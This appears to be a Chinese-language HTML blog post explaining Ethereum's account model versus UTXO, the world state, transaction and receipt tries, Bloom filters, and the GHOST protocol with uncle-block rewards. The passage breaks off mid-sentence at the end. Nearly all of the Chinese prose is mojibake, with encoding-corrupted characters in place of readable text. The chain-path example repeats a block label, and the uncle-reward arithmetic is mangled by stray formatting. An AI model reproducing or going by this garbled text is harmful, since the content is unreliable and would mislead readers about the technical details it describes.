<p><strong>ã€1.èŠ‚çœç©ºé—´ã€‚</strong>å¦‚æœä¸€ä¸ªè´¦æˆ·æœ‰5ä¸ªUTXOï¼Œåˆ™ä»UTXOæ¨¡å¼è½¬æˆè´¦æˆ·æ¨¡å¼æ‰€éœ€ç©ºé—´ä¼šä»300å­—èŠ‚é™åˆ°30å­—èŠ‚ã€‚å…·ä½“è®¡ç®—å¦‚ä¸‹ï¼š 300 &#x3D; (20+32+8ï¼‰* 5 ï¼ˆ20æ˜¯åœ°å€å­—èŠ‚æ•°ï¼Œ32æ˜¯TXçš„idå­—èŠ‚æ•°ï¼Œ8æ˜¯äº¤æ˜“é‡‘é¢å€¼å­—èŠ‚æ•°ï¼‰; 30 &#x3D; 20 + 8 + 2 ( 20æ˜¯åœ°å€å­—èŠ‚æ•°ï¼Œ8æ˜¯äº¤æ˜“é‡‘é¢å€¼å­—èŠ‚æ•°ï¼Œ2æ˜¯nonceâ‘¡å­—èŠ‚æ•°) ä½†å®é™…èŠ‚çº¦å¹¶æ²¡æœ‰è¿™ä¹ˆå¤§ï¼Œå› ä¸ºè´¦æˆ·éœ€è¦è¢«å­˜å‚¨åœ¨å¸•ç‰¹é‡Œå¤æ ‘ä¸­ã€‚å¦å¤–ä»¥å¤ªåŠä¸­äº¤æ˜“ä¹Ÿæ¯”æ¯”ç‰¹å¸ä¸­çš„æ›´å°ï¼ˆä»¥å¤ªåŠä¸­100å­—èŠ‚ï¼Œæ¯”ç‰¹å¸ä¸­200-250å­—èŠ‚ï¼‰ï¼Œå› ä¸ºæ¯æ¬¡äº¤æ˜“åªéœ€è¦ç”Ÿæˆä¸€æ¬¡å¼•ç”¨ï¼Œä¸€æ¬¡ç­¾åï¼Œä»¥åŠä¸€ä¸ªè¾“å‡ºã€‚<strong>2.å¯æ›¿ä»£æ€§æ›´é«˜ã€‚</strong> åœ¨UTXOç»“æ„ä¸­ï¼Œâ€œæœ‰æ•ˆè¾“å‡ºâ€çš„æºç å®ç°ä¸­æ²¡æœ‰åŒºå—é“¾å±‚çš„æ¦‚å¿µï¼Œæ‰€ä»¥ä¸ç®¡æ˜¯åœ¨æŠ€æœ¯è¿˜æ˜¯æ³•å¾‹ä¸Šï¼Œé€šè¿‡å»ºç«‹ä¸€ä¸ªçº¢åå•&#x2F;é»‘åå•ï¼Œå¹¶ä¾æ®çš„è¿™äº›â€œæœ‰æ•ˆè¾“å‡ºâ€çš„æ¥æºåŒºåˆ†å®ƒä»¬å¹¶ä¸æ˜¯å¾ˆå®é™…ã€‚<strong>3.ç®€å•ã€‚</strong> ä»¥å¤ªåŠç¼–ç æ›´ç®€å•ã€æ›´æ˜“äºç†è§£ï¼Œå°¤å…¶æ˜¯åœ¨æ¶‰åŠåˆ°å¤æ‚è„šæœ¬æ—¶ã€‚å°½ç®¡ä»»ä½•å»ä¸­å¿ƒåŒ–åº”ç”¨éƒ½å¯ä»¥ç”¨UTXOæ–¹å¼æ¥å®ç°ï¼Œä½†è¿™ç§æ–¹å¼å®è´¨ä¸Šæ˜¯é€šè¿‡èµ‹äºˆä¸€ä¸ªè„šæœ¬é™åˆ¶ç»™å®šçš„UTXOèƒ½å¤Ÿä½¿ç”¨ä»¥åŠè¯·æ±‚çš„UTXOçš„ç§ç±»çš„æ–¹å¼æ¥å®ç°ï¼ŒåŒ…æ‹¬è„šæœ¬è¯„ä¼°çš„åº”ç”¨æ›´æ”¹æ ¹çŠ¶æ€çš„é»˜å…‹å°”æ ‘è¯æ˜ã€‚å› æ­¤ï¼ŒUTXOå®ç°æ–¹å¼æ¯”ä»¥å¤ªåŠä½¿ç”¨è´¦æˆ·çš„æ–¹å¼è¦å¤æ‚çš„å¤šã€‚<strong>4.è½»å®¢æˆ·ç«¯</strong> è½»å®¢æˆ·ç«¯å¯ä»¥éšæ—¶é€šè¿‡æ²¿æŒ‡å®šæ–¹å‘æ‰«æçŠ¶æ€æ ‘æ¥è®¿é—®ä¸è´¦æˆ·ç›¸å…³çš„æ‰€æœ‰æ•°æ®ã€‚åœ¨UTXOæ–¹å¼ä¸­ï¼Œå¼•ç”¨éšç€æ¯ä¸ªäº¤æ˜“çš„å˜åŒ–è€Œå˜åŒ–ï¼Œè¿™å¯¹äºé•¿æ—¶é—´è¿è¡Œå¹¶ä½¿ç”¨äº†UTXOæ ¹çŠ¶æ€ä¼ æ’­æœºåˆ¶çš„dappåº”ç”¨æ¥è¯´ï¼Œæ— ç–‘æ˜¯ç¹é‡çš„ã€‚ã€‘</p>
<p>è´¦æˆ·æ–¹å¼çš„ä¸€ä¸ªå¼±ç‚¹æ˜¯ï¼šä¸ºäº†é˜»æ­¢é‡æ’­æ”»å‡»ï¼Œæ¯ç¬”äº¤æ˜“å¿…é¡»æœ‰nonceï¼Œnonceçš„å€¼æ˜¯ä¸Šä¸€æ¬¡ä½¿ç”¨çš„nonceå€¼+1ï¼Œè¿™å°±ä½¿å¾—è´¦æˆ·éœ€è¦è·Ÿè¸ªnonceçš„ä½¿ç”¨æƒ…å†µï¼Œå¹¶ä¸”å¿…é¡»ç¡®è®¤äº¤æ˜“çš„Nonceå€¼æ¯”ä¸Šæ¬¡ä½¿ç”¨çš„Nonceå€¼å¤§1ã€‚è§£å†³è¿™ä¸ªé—®é¢˜çš„ä¸€ä¸ªç®€å•æ–¹æ³•æ˜¯è®©äº¤æ˜“åŒ…å«ä¸€ä¸ªåŒºå—å·ï¼Œè¿™æ ·è¿‡ä¸€æ®µæ—¶é—´ä¹‹åï¼Œäº¤æ˜“ä¾¿ä¸èƒ½é‡æ”¾äº†ã€‚</p>
<p>ä¸ºäº†å®ç°è´¦æˆ·æ–¹å¼ï¼Œä»¥å¤ªåŠçš„åšæ³•æ˜¯é‡‡ç”¨çŠ¶æ€(state)çš„æ¦‚å¿µå­˜å‚¨ä¸€ç³»åˆ—è´¦æˆ·ï¼Œæ¯ä¸ªè´¦æˆ·éƒ½æœ‰è‡ªå·±çš„ä½™é¢ï¼Œä»¥åŠä»¥å¤ªåŠç‰¹æœ‰çš„æ•°æ®ï¼ˆä»£ç æˆ–å†…éƒ¨å­˜å‚¨å™¨ï¼‰ã€‚</p>
<p>ä»¥å¤ªåŠçš„çŠ¶æ€ç”±æ¯ä¸ªäº¤æ˜“æ”¹å˜ï¼Œ</p>
<p>ä¸ºäº†ç»´æŠ¤è¿™ä¸ªçŠ¶æ€ï¼Œå’Œæ¯”ç‰¹å¸ä¸åŒï¼Œæ¯”ç‰¹å¸åœ¨åŒºå—ä¸­åªåŒ…æ‹¬äº†äº¤æ˜“çš„merkleæ ‘æ ¹ï¼Œè€Œä»¥å¤ªåŠåœ¨åŒºå—å¤´éƒ¨ä¸­ä¼šåŒ…æ‹¬ä¸‰æ£µæ ‘ï¼Œåˆ†åˆ«æ˜¯ä¸–ç•ŒçŠ¶æ€æ ‘ï¼ˆworld state trieï¼‰ï¼Œäº¤æ˜“æ ‘ï¼ˆtransaction trieï¼‰ä»¥åŠreceiptæ ‘ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233072.jpg" alt="img"></p>
<p>ä¸–ç•ŒçŠ¶æ€</p>
<p>ä¸–ç•ŒçŠ¶æ€æ˜¯åœ°å€ï¼ˆè´¦æˆ·ï¼‰åˆ°è´¦æˆ·çŠ¶æ€çš„æ˜ å°„ã€‚è™½ç„¶ä¸–ç•ŒçŠ¶æ€ä¸ä¿å­˜åœ¨åŒºå—é“¾ä¸Šï¼Œä½†åœ¨é»„çš®ä¹¦çš„æè¿°ä¸­ï¼Œä¸–ç•ŒçŠ¶æ€ä¹Ÿç”±æ ‘æ¥ä¿å­˜æ•°æ®ï¼ˆæ­¤æ ‘ä¹Ÿè¢«ç§°ä¸ºçŠ¶æ€æ•°æ®åº“æˆ–è€…çŠ¶æ€æ ‘ï¼‰ã€‚ä¸–ç•ŒçŠ¶æ€å¯ä»¥è¢«è§†ä½œä¸ºéšç€äº¤æ˜“çš„æ‰§è¡Œè€ŒæŒç»­æ›´æ–°çš„å…¨å±€çŠ¶æ€ï¼Œä¹Ÿæ˜¯ä»¥å¤ªåŠä¸­å”¯ä¸€çš„å…¨å±€çš„æ•°æ®ã€‚</p>
<p>ä»¥å¤ªåŠä¸­æ‰€æœ‰çš„è´¦æˆ·ä¿¡æ¯éƒ½ä½“ç°åœ¨ä¸–ç•ŒçŠ¶æ€ä¹‹ä¸­ï¼Œå¹¶ç”±ä¸–ç•ŒçŠ¶æ€æ ‘ä¿å­˜ï¼ŒçŠ¶æ€æ ‘æŒç»­æ›´æ–°ã€‚å¯¹äºä»¥å¤ªåŠç½‘ç»œä¸­çš„æ¯ä¸€ä¸ªè´¦æˆ·ï¼ŒçŠ¶æ€æ ‘ä¸­å­˜æ”¾äº†ä¸€ä¸ªé”®å€¼å¯¹ï¼Œå…¶ä¸­é”®keyæ˜¯160ä½çš„è´¦æˆ·çš„åœ°å€ï¼Œå€¼valueæ˜¯è´¦æˆ·çš„ç›¸å…³ä¿¡æ¯ï¼Œå¦‚ä¸Šé¢å›¾ä¸­æ‰€å±•ç¤ºçš„ï¼ŒåŒ…æ‹¬</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">- nonce</span><br><span class="line">- balance</span><br><span class="line">- storageRoot</span><br><span class="line">- codeHash</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæƒ³çŸ¥é“æŸä¸€è´¦æˆ·çš„ä½™é¢ï¼Œæˆ–è€…æŸæ™ºèƒ½åˆçº¦å½“å‰çš„çŠ¶æ€ï¼Œå°±éœ€è¦é€šè¿‡æŸ¥è¯¢ä¸–ç•ŒçŠ¶æ€æ ‘æ¥è·å–è¯¥è´¦æˆ·çš„å…·ä½“çŠ¶æ€ä¿¡æ¯ã€‚å…¶ä¸­è´¦æˆ·å­˜å‚¨æ ‘æ˜¯ä¿å­˜ä¸è´¦æˆ·ç›¸å…³è”æ•°æ®çš„ç»“æ„ã€‚è¯¥é¡¹åªæœ‰åˆçº¦è´¦æˆ·æ‰æœ‰ï¼Œè€Œåœ¨ EOA ä¸­ï¼Œ storageRoot ç•™ç©ºã€ codeHash åˆ™æ˜¯ä¸€ä¸²ç©ºå­—ç¬¦ä¸²çš„å“ˆå¸Œå€¼ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233073.jpg" alt="img"></p>
<p>ä¸ºä»€ä¹ˆä»¥å¤ªåŠä¸­éœ€è¦ä¿å­˜ç”¨æˆ·çŠ¶æ€çš„å†å²è®°å½•ï¼Œè€Œæ¯”ç‰¹å¸ä¸­ä¸éœ€è¦å‘¢ï¼Ÿå› ä¸ºï¼Œæ¯”ç‰¹å¸ä¸­åŒºå—ç”Ÿæˆé€Ÿåº¦è¾ƒæ…¢ï¼Œäº§ç”Ÿåˆ†å‰çš„å¯èƒ½æ€§ä¹Ÿè¾ƒä½ã€‚è€Œä¸”ï¼Œå³ä½¿äº§ç”Ÿäº†åˆ†å‰ï¼Œç”±äºæ¯”ç‰¹å¸ç³»ç»Ÿä¸­çš„äº¤æ˜“æ¯”è¾ƒç®€å•ï¼Œåªæ˜¯ç®€å•çš„è½¬è´¦äº¤æ˜“ï¼Œå› æ­¤å›æ»šèµ·æ¥æ¯”è¾ƒæ–¹ä¾¿ã€‚æ¯”è¾ƒå®¹æ˜“å®ç°å°†è¢«æŠ›å¼ƒçš„åˆ†å‰ä¸­çš„äº¤æ˜“è¿›è¡Œå›æ»šã€‚è€Œä»¥å¤ªåŠå°±ä¸ä¸€æ ·äº†ã€‚ä»¥å¤ªåŠçš„åŒºå—ç”Ÿæˆé€Ÿåº¦æ¯”è¾ƒå¿«ï¼Œåå‡ ç§’å°±ä¼šäº§ç”Ÿä¸€ä¸ªåŒºå—ï¼Œå› æ­¤äº§ç”Ÿåˆ†å‰éå¸¸é¢‘ç¹ï¼Œéœ€è¦ç»å¸¸è¿›è¡Œå›æ»šæ“ä½œã€‚æœ€é‡è¦çš„ä¸€ç‚¹æ˜¯ï¼Œä»¥å¤ªåŠä¸­æœ‰æ™ºèƒ½åˆçº¦ï¼Œä½¿å¾—ä»¥å¤ªåŠæ˜¯å›¾çµå®Œå¤‡çš„ï¼Œå¯ä»¥å®ç°å¾ˆå¤æ‚çš„äº¤æ˜“ã€‚å› æ­¤ï¼Œå¦‚æœä¸ä¿å­˜å†å²è®°å½•ï¼Œå°±å¾ˆéš¾è¿›è¡Œå›æ»šæ“ä½œã€‚</p>
<p>äº¤æ˜“æ ‘</p>
<p>æ¯å½“å‘å¸ƒä¸€ä¸ªåŒºå—æ—¶ï¼ŒåŒºå—ä¸­åŒ…å«çš„æ‰€æœ‰äº¤æ˜“ï¼Œä¼šè¢«ç»„ç»‡æˆä¸€æ£µäº¤æ˜“æ ‘ï¼Œè¯¥æ ‘æ˜¯ä¸€æ£µMerkle Patricia Treeï¼ŒæŸ¥æ‰¾çš„é”®å€¼æ˜¯äº¤æ˜“åœ¨å‘å¸ƒæ—¶çš„åºå·ï¼ˆäº¤æ˜“çš„æ’åˆ—é¡ºåºæ˜¯ç”±å‘å¸ƒåŒºå—çš„èŠ‚ç‚¹å†³å®šçš„ï¼‰ã€‚<br>äº¤æ˜“æ ‘ç”¨æ¥è¯æ˜æŸç¬”äº¤æ˜“åœ¨æŸä¸ªåŒºå—å½“ä¸­ã€‚äº¤æ˜“æ ‘ä¸­åŒ…æ‹¬çš„äº¤æ˜“çš„ç»†èŠ‚ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">nonce,</span><br><span class="line">gas price,</span><br><span class="line">gas limit,</span><br><span class="line">recipient,</span><br><span class="line">transfer value,</span><br><span class="line">transaction signature values, and</span><br><span class="line">account initialization (if transaction is of contract creation type), or transaction data (if transaction is a message call)</span><br></pre></td></tr></table></figure>

<p>æ”¶æ®æ ‘</p>
<p>æ¯ä¸ªäº¤æ˜“æ‰§è¡Œå®Œä¹‹åï¼Œä¼šå½¢æˆä¸€ä¸ªæ”¶æ®ï¼Œè®°å½•äº¤æ˜“çš„ç›¸å…³ä¿¡æ¯ï¼Œè€Œè¿™äº›æ”¶æ®ä¼šè¢«ç»„ç»‡æˆä¸€æ£µæ”¶æ®æ ‘ï¼Œè¯¥æ ‘æ˜¯ä¸€æ£µMerkle Patricia Treeï¼ŒæŸ¥æ‰¾çš„é”®å€¼æ˜¯äº¤æ˜“åœ¨å‘å¸ƒæ—¶çš„åºå·ï¼ˆäº¤æ˜“çš„æ’åˆ—é¡ºåºæ˜¯ç”±å‘å¸ƒåŒºå—çš„èŠ‚ç‚¹å†³å®šçš„ï¼‰ã€‚æ”¶æ®æ ‘ä¸­å¯¹åº”çš„äº¤æ˜“çš„ä¿¡æ¯ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">post-transaction state,</span><br><span class="line">the cumulative gas used,</span><br><span class="line">the set of logs created through execution of the transaction, and</span><br><span class="line">the Bloom filter composed from information in those logs</span><br></pre></td></tr></table></figure>


<p>é‚£ä¹ˆï¼Œæ—¢ç„¶å·²ç»æœ‰äº†äº¤æ˜“æ ‘ï¼Œä¸ºä»€ä¹ˆè¿˜éœ€è¦æ”¶æ®æ ‘è¿™ä¸ªæ•°æ®ç»“æ„å‘¢ï¼Ÿ<br>å› ä¸ºï¼Œä»¥å¤ªåŠæ‹¥æœ‰æ™ºèƒ½åˆçº¦ï¼Œè€Œæ™ºèƒ½åˆçº¦çš„æ‰§è¡Œè¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œé€šè¿‡å¢åŠ æ”¶æ®æ ‘ï¼Œæœ‰åˆ©äºç³»ç»Ÿå¿«é€ŸæŸ¥è¯¢æ‰§è¡Œçš„ç»“æœã€‚<br>åœ¨ä»¥å¤ªåŠä¸­ï¼Œæ¯ä¸ªäº¤æ˜“å¯¹åº”çš„æ”¶æ®ä¸­éƒ½ä¼šåŒ…å«ä¸€ä¸ªBloom filterï¼Œè®°å½•è¿™ä¸ªäº¤æ˜“çš„ç±»å‹ã€åœ°å€ç­‰ä¿¡æ¯ã€‚å‘å¸ƒçš„åŒºå—çš„å—å¤´ä¸­ä¹Ÿæœ‰ä¸€ä¸ªæ€»çš„Bloom filterï¼Œè¿™ä¸ªBloom filteræ˜¯æ‰€æœ‰æ”¶æ®ä¸­çš„Bloom filterçš„å¹¶é›†ã€‚<br>å¦‚æœæˆ‘ä»¬éœ€è¦æŸ¥æ‰¾è¿‡å»ä¸€æ®µæ—¶é—´å†…å‘ç”Ÿçš„å’ŒæŸä¸ªæ™ºèƒ½åˆçº¦ç›¸å…³çš„æ‰€æœ‰äº¤æ˜“ï¼Œé¦–å…ˆéœ€è¦åœ¨åŒºå—çš„å—å¤´ä¸­çš„Bloom filterä¸­çœ‹çœ‹æœ‰æ²¡æœ‰æˆ‘ä»¬è¦æŸ¥æ‰¾çš„äº¤æ˜“çš„ç±»å‹ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œå†åˆ°åŒºå—ä¸­çš„æ¯ä¸ªäº¤æ˜“å¯¹åº”çš„æ”¶æ®çš„Bloom filterä¸­è¿›è¡ŒæŸ¥æ‰¾ï¼›è€Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œé‚£ä¹ˆè¯¥åŒºå—ä¸­ä¸€å®šæ²¡æœ‰æˆ‘ä»¬è¦æŸ¥æ‰¾çš„äº¤æ˜“ç±»å‹ã€‚é€šè¿‡è¯¥ç§æ–¹æ³•ï¼Œå°±å¯ä»¥å¿«é€Ÿæ’é™¤æ‰æ— å…³çš„æ”¶æ®ï¼Œä»è€Œæé«˜æŸ¥æ‰¾é€Ÿåº¦ã€‚</p>
<p>ï¼ˆä¸‰ï¼‰çŠ¶æ€</p>
<p>ï¼ˆå››ï¼‰åŒºå—é“¾ç›²</p>
<p>åœ¨è„šæœ¬å›¾çµå®Œå¤‡ä»¥åŠç»´æŠ¤äº†çŠ¶æ€æ ‘çš„æƒ…å†µä¸‹ï¼Œä»¥ä¸Šä¸¤ä¸ªç‰¹å¾å®ç°èµ·æ¥å°±å®¹æ˜“äº†ã€‚</p>
<p>GHOSTåè®®</p>
<p>GHOSTï¼ˆGreedy Heaviest Observed Subtreeï¼‰æ˜¯ä¸€ç§ä¸»é“¾ï¼ˆéä¾§é“¾ï¼‰é€‰æ‹©åè®®ã€‚ä¸¾ä¾‹æ¥è¯´ï¼šç»å…¸çš„Proof-of-Workï¼ˆPOWï¼‰æ˜¯ä»¥å–æœ€é•¿çš„ä¸»é“¾ä¸ºåŸºæœ¬åŸåˆ™ï¼ŒGHOSTåè®®åˆ™æ˜¯ä»¥åŒ…å«å—æ•°æœ€å¤šä¸ºåŸºæœ¬åŸåˆ™ã€‚</p>
<p>åœ¨æ¯”ç‰¹å¸åè®®ä¸­ï¼Œæœ€é•¿çš„é“¾è¢«è®¤ä¸ºæ˜¯ç»å¯¹çš„æ­£ç¡®ã€‚å¦‚æœä¸€ä¸ªå—ä¸æ˜¯æœ€é•¿é“¾çš„ä¸€éƒ¨åˆ†ï¼Œé‚£ä¹ˆå®ƒè¢«ç§°ä¸ºæ˜¯â€œå­¤å—â€ã€‚ä¸€ä¸ªå­¤ç«‹çš„å—ä¹Ÿæ˜¯åˆæ³•çš„ï¼Œä½†æ˜¯å‘ç°çš„ç¨æ™šï¼Œæˆ–è€…æ˜¯ç½‘ç»œä¼ è¾“ç¨æ…¢ï¼Œè€Œæ²¡æœ‰èƒ½æˆä¸ºæœ€é•¿çš„é“¾çš„ä¸€éƒ¨åˆ†ã€‚åœ¨æ¯”ç‰¹å¸ä¸­ï¼Œå­¤å—æ²¡æœ‰æ„ä¹‰ï¼Œéšåå°†è¢«æŠ›å¼ƒï¼Œå‘ç°è¿™ä¸ªå­¤å—çš„çŸ¿å·¥ä¹Ÿæ‹¿ä¸åˆ°é‡‡çŸ¿ç›¸å…³çš„å¥–åŠ±ã€‚ä¾‹å¦‚ï¼šæŒ–çŸ¿èŠ‚ç‚¹Aæ˜¯ä¸€ä¸ªçŸ¿æ± å æœ‰å…¨ç½‘30%çš„ç®—åŠ›ï¼ŒæŒ–çŸ¿èŠ‚ç‚¹Bå æœ‰å…¨ç½‘ç®—åŠ›çš„10%ï¼ŒèŠ‚ç‚¹Aä¼šæœ‰70%çš„æ¦‚ç‡äº§ç”ŸåºŸå—ï¼ŒèŠ‚ç‚¹Bæœ‰90%çš„æ¦‚ç‡äº§ç”ŸåºŸå—ã€‚</p>
<p>ä»¥å¤ªåŠå¹³å‡10å¤šç§’å‘å¸ƒä¸€ä¸ªåŒºå—ï¼Œ<strong>æ›´çŸ­çš„å‡ºå—æ—¶é—´æ„å‘³ç€ï¼Œä¸´æ—¶æ€§åˆ†å‰çš„å‡ ç‡å°†å¤§å¹…æå‡</strong>ã€‚è¿™æ˜¯å› ä¸ºå½“çŸ¿å·¥AæŒ–å‡ºä¸€ä¸ªæ–°åŒºå—åï¼Œéœ€è¦å‘å…¨ç½‘å¹¿æ’­ï¼Œå¹¿æ’­çš„è¿‡ç¨‹éœ€è¦æ—¶é—´ï¼Œç”±äºä»¥å¤ªåŠå‡ºå—æ—¶é—´çŸ­ï¼Œå…¶ä»–èŠ‚ç‚¹å¯èƒ½è¿˜æ²¡æœ‰æ”¶åˆ°çŸ¿å·¥Aå‘å¸ƒçš„åŒºå—ï¼Œå°±å·²ç»æŒ–å‡ºäº†åŒä¸€é«˜åº¦çš„åŒºå—ï¼Œè¿™å°±é€ æˆäº†ä¸´æ—¶åˆ†å‰ã€‚<strong>åœ¨ä»¥å¤ªåŠç½‘ç»œä¸­ï¼Œä¸´æ—¶æ€§åˆ†å‰å‘ç”Ÿçš„å‡ ç‡åœ¨8%å·¦å³ã€‚</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233074.png" alt="img"></p>
<p>åŒæ—¶ï¼Œå¦‚æœæ–°æ—§åŒºå—ä¹‹é—´äº§ç”Ÿçš„é—´éš”å¤ªçŸ­, åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œåˆ™èŠ‚ç‚¹Aä¼šå› ä¸ºè§„æ¨¡æ•ˆåº”è€Œæ¯”BèŠ‚ç‚¹æ›´ä¸ºé«˜æ•ˆã€‚æ‰€ä»¥æ–°æ—§åŒºå—çš„é—´éš”è¿‡çŸ­ä¼šå¯¼è‡´å•ä¸€çš„çŸ¿æ± ä¸»å¯¼å…¨ç½‘çš„æŒ–çŸ¿è¿‡ç¨‹ã€‚è€ŒåŒºå—ä¸­çš„æ•°æ®é‡å¤éªŒè¯6æ¬¡ï¼ˆè‹¥å¹²æ¬¡ï¼‰ç«‹å³æ°¸ä¹…å°å­˜åœ°åŒºå—ä¸­ï¼Œä¸€æ—¦51%ç®—åŠ›æ”»å‡»ä¸€æ—¦å‘ç”Ÿï¼Œdouble-spendç­‰ç³Ÿç³•é—®é¢˜ä¼šå‡ºç°ï¼Œæ¶æ„çš„æ•°æ®å®¹æ˜“æ°¸ä¹…å°å­˜äºåŒºå—ä¸­ï¼Œæ•´ä¸ªblockchainç³»ç»Ÿéœ€è¦è¶³å¤Ÿé•¿çš„æ—¶é—´æ¥å¤„ç†å’Œæ¢å¤é»‘å®¢æ¶æ„æ”»å‡»æ‰€é€ æˆçš„ç ´åã€‚</p>
<p>åœ¨ä»¥å¤ªåŠä¸­ï¼Œæ ¹æ®GHOSTåè®®ï¼Œä¸è®¤ä¸ºå­¤å—æ²¡æœ‰ä»·å€¼ï¼Œè€Œæ˜¯ä¼šç»™ä¸å‘ç°å­¤å—çš„çŸ¿å·¥ä»¥å›æŠ¥ã€‚å­¤å—è¢«ç§°ä¸ºâ€œå”å—â€(uncle block)ï¼Œå®ƒä»¬å¯ä»¥ä¸ºä¸»é“¾çš„å®‰å…¨ä½œå‡ºè´¡çŒ®ï¼Œä¹ŸåŒæ ·èƒ½è·å¾—å¥–åŠ±ï¼Œè¿™æ¿€åŠ±äº†çŸ¿å·¥åœ¨æ–°å‘ç°çš„å—ä¸­å»å¼•ç”¨å”å—ï¼Œå‡å°‘äº†å­¤å—çš„äº§ç”Ÿã€‚</p>
<p>Ghoståè®®è§£å†³äº†ä¸¤ä¸ªé—®é¢˜ï¼šæ‘’å¼ƒäº†å•ä¸€çš„æœ€é•¿é“¾åŸåˆ™, å–è€Œä»£ä¹‹çš„æ˜¯æœ€å¤§å­æ•°åŸåˆ™ï¼›å­¤å—å¥–åŠ±é—®é¢˜ã€‚</p>
<p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233075.jpg" alt="img"></p>
<p>å¦‚æœå•çº¯çš„è®¡ç®—æœ€é•¿é“¾åŸåˆ™, ä¸»é“¾åº”è¯¥æ˜¯ 0 -&gt; 1B -&gt; 2D -&gt; 3F -&gt; 3F -&gt; 4C -&gt; 5B.<br>å¦‚æœé‡‡ç”¨äº†GHOSTåè®®, ä»¥å‰çš„â€åºŸå—â€ä¹Ÿä¼šè¢«è€ƒè™‘åˆ°ä¸»é“¾çš„è®¡ç®—é‡ä¸­.æ¯ä¸€ä¸ªèŠ‚ç‚¹ä¸‹å«ä¸€ä¸ªå­æ ‘, å…„å¼ŸèŠ‚ç‚¹ä¹‹é—´å­æ ‘èŠ‚ç‚¹æœ€å¤šçš„è¢«é€‰ä¸ºä¸»é“¾. è¿™æ ·ä¸€æ¥ 0 -&gt; 1B -&gt; 2C -&gt; 3D -&gt; 4B æˆä¸ºä¸»é“¾,<br>å¦‚æœé‡‡ç”¨GHOSTåè®®, ä¸€ä¸ªæ”»å‡»è€…ä»…ä»…æä¾›ä¸€ä¸ª1Aåˆ°6Açš„é•¿é“¾å¹¶ä¸èƒ½è¢«è®¤ä¸ºæ˜¯ä¸»é“¾ã€‚</p>
<p>Ghoståè®®çš„ä¼˜åŠ¿åœ¨äºï¼š</p>
<ul>
<li>ä»¥å¤ªåŠåå‡ ç§’çš„å‡ºå—é—´éš”ï¼Œå¤§å¤§å¢åŠ äº†å­¤å—çš„äº§ç”Ÿï¼Œå¹¶ä¸”é™ä½äº†å®‰å…¨æ€§ã€‚é€šè¿‡é¼“åŠ±å¼•ç”¨å”å—ï¼Œä½¿å¼•ç”¨ä¸»é“¾è·å¾—æ›´å¤šçš„å®‰å…¨ä¿è¯ï¼ˆå› ä¸ºå­¤å—æœ¬èº«ä¹Ÿæ˜¯åˆæ³•çš„ï¼‰</li>
<li>æ¯”ç‰¹å¸ä¸­ï¼Œé‡‡çŸ¿ä¸­å¿ƒåŒ–(å¤§é‡çš„é›†ä¸­çŸ¿æ± )æˆä¸ºä¸€ä¸ªé—®é¢˜ã€‚Ghoståè®®ä¸‹ï¼Œå”å—ä¹Ÿæ˜¯èƒ½å¤Ÿè·å¾—æŠ¥é…¬ï¼Œå¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šç¼“è§£è¿™ä¸ªé—®é¢˜ã€‚</li>
</ul>
<p>å­¤å—å¥–åŠ±é—®é¢˜ï¼š</p>
<ul>
<li>ä¸»é“¾èŠ‚ç‚¹è·å¾—base rewardï¼›</li>
<li>ä¸€ä¸ªèŠ‚ç‚¹æœ€å¤šå¼•ç”¨ä¸¤ä¸ªå”å—ï¼›</li>
<li>å”å—å¿…é¡»æ˜¯åŒºå—çš„å‰2å±‚~å‰7å±‚çš„ç¥–å…ˆçš„ç›´æ¥å­å—ï¼›</li>
<li>è¢«å¼•ç”¨è¿‡çš„å”å—ä¸èƒ½é‡å¤å¼•ç”¨ï¼›</li>
<li>å¼•ç”¨å”å—çš„åŒºå—ï¼Œå¯ä»¥è·å¾—æŒ–çŸ¿æŠ¥é…¬çš„1&#x2F;32ï¼Œä¹Ÿå°±æ˜¯5<strong>1&#x2F;32&#x3D;0.15625 Etherï¼Œæœ€å¤šè·å¾—2</strong>0.15625&#x3D;0.3125 Etherï¼›</li>
<li>ä¸»é“¾èŠ‚ç‚¹çš„å…„å¼Ÿï¼ˆéä¸»é“¾èŠ‚ç‚¹ï¼‰è·å¾— ((å”å—é«˜åº¦+8-å½“å‰å—çš„é«˜åº¦)&#x2F;8 )*base rewardï¼Œå¦‚ä¸‹å›¾è¡¨æ ¼æ‰€ç¤ºï¼›</li>
<li>äº¤æ˜“è´¹ç”¨(transaction fee)ä¸ä¼šåˆ†é…ç»™å”å—</li>
</ul>
<p>æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥ä»‹ç»ä¸Šé¢çš„è§„åˆ™ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233076.jpg" alt="img"></p>
<p>å‡è®¾å½“å‰åŒºå—é«˜åº¦ä¸º107ï¼ˆä¸Šå›¾ä¸­ç»¿è‰²åŒºå—ï¼‰ï¼Œå®ƒèƒ½æœ‰æ•ˆå¼•ç”¨çš„å”å—ï¼Œåªèƒ½æ˜¯åŒºå—é«˜åº¦ä¸º101ï½106çš„åŒºå—ï¼Œæ¢å¥è¯´<strong>å”å—çš„æœ‰æ•ˆå¼•ç”¨åŒºé—´ï¼Œæœ€å¤šåªèƒ½åœ¨7ä»£ä»¥å†…ã€‚</strong>ä¸Šå›¾ä¸­é»„è‰²åŒºå—ï¼ŒåŒºå—é«˜åº¦ä¸º100ï¼Œå°±ä¸åœ¨107è¿™ä¸ªåŒºå—çš„æœ‰æ•ˆå¼•ç”¨èŒƒå›´ã€‚å›¾ä¸­çº¢è‰²çš„åŒºå—ï¼Œå› 